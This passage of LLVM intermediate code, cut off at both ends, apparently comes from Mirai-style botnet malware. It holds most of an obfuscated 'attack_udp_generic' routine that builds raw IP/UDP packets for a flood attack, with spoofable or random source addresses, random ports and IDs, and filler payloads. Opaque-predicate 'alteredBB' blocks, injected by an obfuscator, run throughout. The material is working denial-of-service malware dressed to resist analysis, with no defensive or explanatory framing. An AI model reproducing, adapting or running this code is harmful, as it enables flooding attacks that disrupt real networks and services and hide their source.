  %1090 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1089, i64 1
  %1091 = bitcast %struct.tcphdr* %1090 to i8*
  store i8* %1091, i8** %53, align 8
  %1092 = load i16, i16* %24, align 2
  %1093 = zext i16 %1092 to i32
  %1094 = icmp eq i32 %1093, 65535
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %796
  %1095 = load i8*, i8** %53, align 8
  %1096 = load i32, i32* %34, align 4
  call void @rand_alphastr(i8* %1095, i32 %1096)
  %1097 = load i8*, i8** %53, align 8
  %1098 = load i32, i32* %34, align 4
  %1099 = sext i32 %1098 to i64
  %1100 = getelementptr inbounds i8, i8* %1097, i64 %1099
  store i8 0, i8* %1100, align 1
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %891
  %1101 = load i32, i32* %19, align 4
  %_72 = sub i32 0, %1101
  %gen73 = add i32 %_72, 1
  %_74 = sub i32 0, %1101
  %gen75 = add i32 %_74, 1
  %_76 = shl i32 %1101, 1
  %_77 = sub i32 0, %1101
  %gen78 = add i32 %_77, 1
  %_79 = sub i32 0, %1101
  %gen80 = add i32 %_79, 1
  %_81 = sub i32 %1101, 1
  %gen82 = mul i32 %_81, 1
  %_83 = sub i32 0, %1101
  %gen84 = add i32 %_83, 1
  %1102 = add nsw i32 %1101, 1
  store i32 %1102, i32* %19, align 4
  br label %originalBB71
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  br i1 %78, label %79, label %96

; <label>:79:                                     ; preds = %5
  %80 = load i32, i32* @x.29
  %81 = load i32, i32* @y.30
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %79
  store i16 1460, i16* %20, align 2
  %88 = load i32, i32* @x.29
  %89 = load i32, i32* @y.30
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %96

; <label>:96:                                     ; preds = %originalBBpart2, %5
  %97 = load i32, i32* @x.29
  %98 = load i32, i32* @y.30
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %96
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %105, i32* %12, align 4
  %106 = icmp eq i32 %105, -1
  %107 = load i32, i32* @x.29
  %108 = load i32, i32* @y.30
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %106, label %115, label %132

; <label>:115:                                    ; preds = %originalBBpart24
  %116 = load i32, i32* @x.29
  %117 = load i32, i32* @y.30
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %115
  %124 = load i32, i32* @x.29
  %125 = load i32, i32* @y.30
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %570

; <label>:132:                                    ; preds = %originalBBpart24
  store i32 1, i32* %11, align 4
  %133 = load i32, i32* %12, align 4
  %134 = bitcast i32* %11 to i8*
  %135 = call i32 @setsockopt(i32 %133, i32 0, i32 3, i8* %134, i32 4) #6
  %136 = icmp eq i32 %135, -1
  br i1 %136, label %137, label %156

; <label>:137:                                    ; preds = %132
  %138 = load i32, i32* @x.29
  %139 = load i32, i32* @y.30
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %137
  %146 = load i32, i32* %12, align 4
  %147 = call i32 @close(i32 %146)
  %148 = load i32, i32* @x.29
  %149 = load i32, i32* @y.30
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %570

; <label>:156:                                    ; preds = %132
  %157 = load i32, i32* @x.29
  %158 = load i32, i32* @y.30
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %156
  store i32 0, i32* %11, align 4
  %165 = load i32, i32* @x.29
  %166 = load i32, i32* @y.30
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %173

; <label>:173:                                    ; preds = %originalBBpart257, %originalBBpart216
  %174 = load i32, i32* %11, align 4
  %175 = load i8, i8* %7, align 1
  %176 = zext i8 %175 to i32
  %177 = icmp slt i32 %174, %176
  br i1 %177, label %178, label %306

; <label>:178:                                    ; preds = %173
  %179 = load i32, i32* @x.29
  %180 = load i32, i32* @y.30
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %178
  %187 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %188 = load i8**, i8*** %13, align 8
  %189 = load i32, i32* %11, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8*, i8** %188, i64 %190
  store i8* %187, i8** %191, align 8
  %192 = load i8**, i8*** %13, align 8
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8*, i8** %192, i64 %194
  %196 = load i8*, i8** %195, align 8
  %197 = bitcast i8* %196 to %struct.iphdr*
  store %struct.iphdr* %197, %struct.iphdr** %24, align 8
  %198 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i64 1
  %200 = bitcast %struct.iphdr* %199 to %struct.udphdr*
  store %struct.udphdr* %200, %struct.udphdr** %25, align 8
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = bitcast %struct.iphdr* %201 to i8*
  %203 = load i8, i8* %202, align 4
  %204 = and i8 %203, 15
  %205 = or i8 %204, 64
  store i8 %205, i8* %202, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = bitcast %struct.iphdr* %206 to i8*
  %208 = load i8, i8* %207, align 4
  %209 = and i8 %208, -16
  %210 = or i8 %209, 5
  store i8 %210, i8* %207, align 4
  %211 = load i8, i8* %14, align 1
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 1
  store i8 %211, i8* %213, align 1
  %214 = load i16, i16* %20, align 2
  %215 = zext i16 %214 to i64
  %216 = add i64 28, %215
  %217 = trunc i64 %216 to i16
  %218 = call zeroext i16 @htons(i16 zeroext %217) #7
  %219 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 2
  store i16 %218, i16* %220, align 2
  %221 = load i16, i16* %15, align 2
  %222 = call zeroext i16 @htons(i16 zeroext %221) #7
  %223 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 3
  store i16 %222, i16* %224, align 4
  %225 = load i8, i8* %16, align 1
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 5
  store i8 %225, i8* %227, align 4
  %228 = load i8, i8* %17, align 1
  %229 = icmp ne i8 %228, 0
  %230 = load i32, i32* @x.29
  %231 = load i32, i32* @y.30
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart248, label %originalBB18alteredBB

originalBBpart248:                                ; preds = %originalBB18
  br i1 %229, label %238, label %258

; <label>:238:                                    ; preds = %originalBBpart248
  %239 = load i32, i32* @x.29
  %240 = load i32, i32* @y.30
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %238
  %247 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %248 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 4
  store i16 %247, i16* %249, align 2
  %250 = load i32, i32* @x.29
  %251 = load i32, i32* @y.30
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %258

; <label>:258:                                    ; preds = %originalBBpart252, %originalBBpart248
  %259 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 6
  store i8 17, i8* %260, align 1
  %261 = load i32, i32* %22, align 4
  %262 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 8
  store i32 %261, i32* %263, align 4
  %264 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %267, i32 0, i32 1
  %269 = load i32, i32* %268, align 4
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 9
  store i32 %269, i32* %271, align 4
  %272 = load i16, i16* %18, align 2
  %273 = call zeroext i16 @htons(i16 zeroext %272) #7
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %274, i32 0, i32 0
  store i16 %273, i16* %275, align 2
  %276 = load i16, i16* %19, align 2
  %277 = call zeroext i16 @htons(i16 zeroext %276) #7
  %278 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i32 0, i32 1
  store i16 %277, i16* %279, align 2
  %280 = load i16, i16* %20, align 2
  %281 = zext i16 %280 to i64
  %282 = add i64 8, %281
  %283 = trunc i64 %282 to i16
  %284 = call zeroext i16 @htons(i16 zeroext %283) #7
  %285 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 2
  store i16 %284, i16* %286, align 2
  br label %287

; <label>:287:                                    ; preds = %258
  %288 = load i32, i32* @x.29
  %289 = load i32, i32* @y.30
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %287
  %296 = load i32, i32* %11, align 4
  %297 = add nsw i32 %296, 1
  store i32 %297, i32* %11, align 4
  %298 = load i32, i32* @x.29
  %299 = load i32, i32* @y.30
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart257, label %originalBB54alteredBB

originalBBpart257:                                ; preds = %originalBB54
  br label %173

; <label>:306:                                    ; preds = %173
  br label %307

; <label>:307:                                    ; preds = %569, %306
  store i32 0, i32* %11, align 4
  br label %308

; <label>:308:                                    ; preds = %544, %307
  %309 = load i32, i32* %11, align 4
  %310 = load i8, i8* %7, align 1
  %311 = zext i8 %310 to i32
  %312 = icmp slt i32 %309, %311
  br i1 %312, label %313, label %547

; <label>:313:                                    ; preds = %308
  %314 = load i8**, i8*** %13, align 8
  %315 = load i32, i32* %11, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds i8*, i8** %314, i64 %316
  %318 = load i8*, i8** %317, align 8
  store i8* %318, i8** %26, align 8
  %319 = load i8*, i8** %26, align 8
  %320 = bitcast i8* %319 to %struct.iphdr*
  store %struct.iphdr* %320, %struct.iphdr** %27, align 8
  %321 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i64 1
  %323 = bitcast %struct.iphdr* %322 to %struct.udphdr*
  store %struct.udphdr* %323, %struct.udphdr** %28, align 8
  %324 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i64 1
  %326 = bitcast %struct.udphdr* %325 to i8*
  store i8* %326, i8** %29, align 8
  %327 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %328 = load i32, i32* %11, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %327, i64 %329
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %330, i32 0, i32 2
  %332 = load i8, i8* %331, align 4
  %333 = zext i8 %332 to i32
  %334 = icmp slt i32 %333, 32
  br i1 %334, label %335, label %372

; <label>:335:                                    ; preds = %313
  %336 = load i32, i32* @x.29
  %337 = load i32, i32* @y.30
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %335
  %344 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %345 = load i32, i32* %11, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i32 0, i32 1
  %349 = load i32, i32* %348, align 4
  %350 = call i32 @ntohl(i32 %349) #7
  %351 = call i32 @rand_next()
  %352 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %353 = load i32, i32* %11, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %355, i32 0, i32 2
  %357 = load i8, i8* %356, align 4
  %358 = zext i8 %357 to i32
  %359 = lshr i32 %351, %358
  %360 = add i32 %350, %359
  %361 = call i32 @htonl(i32 %360) #7
  %362 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 9
  store i32 %361, i32* %363, align 4
  %364 = load i32, i32* @x.29
  %365 = load i32, i32* @y.30
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBBpart270, label %originalBB59alteredBB

originalBBpart270:                                ; preds = %originalBB59
  br label %372

; <label>:372:                                    ; preds = %originalBBpart270, %313
  %373 = load i32, i32* @x.29
  %374 = load i32, i32* @y.30
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %372
  %381 = load i32, i32* %22, align 4
  %382 = icmp eq i32 %381, -1
  %383 = load i32, i32* @x.29
  %384 = load i32, i32* @y.30
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %382, label %391, label %395

; <label>:391:                                    ; preds = %originalBBpart274
  %392 = call i32 @rand_next()
  %393 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 8
  store i32 %392, i32* %394, align 4
  br label %395

; <label>:395:                                    ; preds = %391, %originalBBpart274
  %396 = load i16, i16* %15, align 2
  %397 = zext i16 %396 to i32
  %398 = icmp eq i32 %397, 65535
  br i1 %398, label %399, label %404

; <label>:399:                                    ; preds = %395
  %400 = call i32 @rand_next()
  %401 = trunc i32 %400 to i16
  %402 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 3
  store i16 %401, i16* %403, align 4
  br label %404

; <label>:404:                                    ; preds = %399, %395
  %405 = load i16, i16* %18, align 2
  %406 = zext i16 %405 to i32
  %407 = icmp eq i32 %406, 65535
  br i1 %407, label %408, label %413

; <label>:408:                                    ; preds = %404
  %409 = call i32 @rand_next()
  %410 = trunc i32 %409 to i16
  %411 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 0
  store i16 %410, i16* %412, align 2
  br label %413

; <label>:413:                                    ; preds = %408, %404
  %414 = load i32, i32* @x.29
  %415 = load i32, i32* @y.30
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %413
  %422 = load i16, i16* %19, align 2
  %423 = zext i16 %422 to i32
  %424 = icmp eq i32 %423, 65535
  %425 = load i32, i32* @x.29
  %426 = load i32, i32* @y.30
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %424, label %433, label %438

; <label>:433:                                    ; preds = %originalBBpart278
  %434 = call i32 @rand_next()
  %435 = trunc i32 %434 to i16
  %436 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %437 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %436, i32 0, i32 1
  store i16 %435, i16* %437, align 2
  br label %438

; <label>:438:                                    ; preds = %433, %originalBBpart278
  %439 = load i32, i32* @x.29
  %440 = load i32, i32* @y.30
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %438
  %447 = load i8, i8* %21, align 1
  %448 = icmp ne i8 %447, 0
  %449 = load i32, i32* @x.29
  %450 = load i32, i32* @y.30
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %448, label %457, label %481

; <label>:457:                                    ; preds = %originalBBpart282
  %458 = load i32, i32* @x.29
  %459 = load i32, i32* @y.30
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %457
  %466 = load i8*, i8** %29, align 8
  %467 = load i16, i16* %20, align 2
  %468 = zext i16 %467 to i32
  call void @rand_alphastr(i8* %466, i32 %468)
  %469 = load i8*, i8** %29, align 8
  %470 = load i16, i16* %20, align 2
  %471 = zext i16 %470 to i64
  %472 = getelementptr inbounds i8, i8* %469, i64 %471
  store i8 0, i8* %472, align 1
  %473 = load i32, i32* @x.29
  %474 = load i32, i32* @y.30
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %481

; <label>:481:                                    ; preds = %originalBBpart286, %originalBBpart282
  %482 = load i32, i32* @x.29
  %483 = load i32, i32* @y.30
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %481
  %490 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i32 0, i32 7
  store i16 0, i16* %491, align 2
  %492 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %493 = bitcast %struct.iphdr* %492 to i16*
  %494 = call zeroext i16 @checksum_generic(i16* %493, i32 20)
  %495 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 7
  store i16 %494, i16* %496, align 2
  %497 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %498 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %497, i32 0, i32 3
  store i16 0, i16* %498, align 2
  %499 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %500 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %501 = bitcast %struct.udphdr* %500 to i8*
  %502 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %503 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %502, i32 0, i32 2
  %504 = load i16, i16* %503, align 2
  %505 = load i16, i16* %20, align 2
  %506 = zext i16 %505 to i64
  %507 = add i64 8, %506
  %508 = trunc i64 %507 to i32
  %509 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %499, i8* %501, i16 zeroext %504, i32 %508)
  %510 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %511 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %510, i32 0, i32 3
  store i16 %509, i16* %511, align 2
  %512 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %513 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %512, i32 0, i32 1
  %514 = load i16, i16* %513, align 2
  %515 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %516 = load i32, i32* %11, align 4
